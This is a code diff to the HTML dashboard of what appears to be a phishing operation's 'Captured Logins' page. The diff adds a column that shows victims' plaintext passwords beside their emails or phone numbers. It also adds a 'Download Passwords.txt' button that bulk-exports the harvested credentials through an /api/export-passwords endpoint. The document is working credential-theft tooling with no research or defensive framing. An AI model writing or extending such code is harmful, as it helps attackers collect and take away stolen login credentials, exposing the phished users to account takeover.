@@ -153,7 +153,10 @@
   <div class="container">
     <h1>Captured Logins</h1>
     
-    <button class="refresh-btn" onclick="loadLogins()">Refresh</button>
+    <div style="display: flex; gap: 12px; margin-bottom: 16px;">
+      <button class="refresh-btn" onclick="loadLogins()">Refresh</button>
+      <button class="refresh-btn" onclick="exportPasswords()" style="background: #34a853;">Download Passwords.txt</button>
+    </div>
     
     <div class="stats" id="stats"></div>
     
@@ -163,6 +166,7 @@
         <thead>
           <tr>
             <th>Email/Phone</th>
+            <th>Password</th>
             <th>Password Hash</th>
             <th>Captured At</th>
           </tr>
@@ -219,9 +223,15 @@
             <tr>
               <td class="identifier">${entry.identifier}</td>
               <td>
-                ${entry.passwordHash 
-                  ? `<span class="has-password">✓</span> <span class="password-hash">${entry.passwordHash}</span>`
+                ${entry.password 
+                  ? `<span class="has-password" style="color: #34a853; font-weight: 500;">${entry.password}</span>`
                   : '<span class="no-password">No password captured</span>'
+                }
+              </td>
+              <td>
+                ${entry.passwordHash 
+                  ? `<span class="password-hash">${entry.passwordHash.substring(0, 50)}...</span>`
+                  : '<span class="no-password">-</span>'
                 }
               </td>
               <td class="timestamp">${formatDate(entry.createdAt)}</td>
@@ -233,6 +243,10 @@
           document.getElementById('empty').style.display = 'block';
           document.getElementById('empty').textContent = 'Error loading logins: ' + err.message;
         });
+    }
+
+    function exportPasswords() {
+      window.location.href = '/api/export-passwords';
     }
 
     // Load on page load
